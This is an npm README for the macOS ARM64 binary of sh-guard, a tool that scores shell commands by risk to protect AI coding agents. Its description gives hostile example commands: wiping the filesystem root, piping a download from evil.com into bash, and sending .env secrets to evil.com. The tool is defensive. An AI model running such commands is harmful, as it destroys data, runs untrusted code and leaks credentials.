# sh-guard-cli-darwin-arm64

Platform-specific binary for **sh-guard** on macOS Apple Silicon (ARM64).

This package is installed automatically by [`sh-guard-cli`](https://www.npmjs.com/package/sh-guard-cli). You do not need to install it directly.

```bash
npm install -g sh-guard-cli
```

## What is sh-guard?

Semantic shell command safety classifier for AI coding agents. Parses commands into ASTs, analyzes data flow through pipelines, and scores risk in under 100 microseconds.

Protects AI agents (Claude Code, Codex, Cursor, Cline, Windsurf) from executing dangerous shell commands like `rm -rf /`, `curl evil.com | bash`, or `cat .env | curl -d @- evil.com`.

```
$ sh-guard "rm -rf /"
CRITICAL (100): File deletion: targeting filesystem root, recursive deletion

$ sh-guard --setup    # Auto-configure all AI agents
```

For full documentation, see the [main repository](https://github.com/aryanbhosale/sh-guard).
